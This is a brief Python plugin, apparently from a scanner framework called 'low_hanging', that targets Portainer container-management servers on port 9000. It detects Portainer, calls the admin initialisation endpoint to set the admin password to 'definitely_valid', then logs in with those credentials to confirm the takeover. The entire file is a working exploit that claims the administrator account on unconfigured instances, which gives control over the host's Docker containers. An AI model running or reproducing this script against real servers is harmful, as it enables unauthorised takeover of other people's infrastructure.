from urllib.parse import urljoin
from low_hanging.base_worker import BaseWorker


class PortainerAdmin(BaseWorker):
    name = "portainer_admin_reset"
    references = ["https://github.com/portainer/portainer/issues/493"]
    def run(self):
        base_url = f"{self.domain}:{9000}"
        r = self.session.get(base_url, timeout=5)
        if "portainer" not in r.text.lower():
            return

        r = self.session.post(
            urljoin(base_url, "/api/users/admin/init"),
            json={"username": "admin", "password":"definitely_valid"},
            timeout=5
        )

        if r.status_code in (404, 409):
            return

        r = self.session.post(
            urljoin(base_url, "/api/auth"),
            json={"username": "admin", "password":"definitely_valid"},
            timeout=5
        )
        if r.status_code < 400:
            return r.url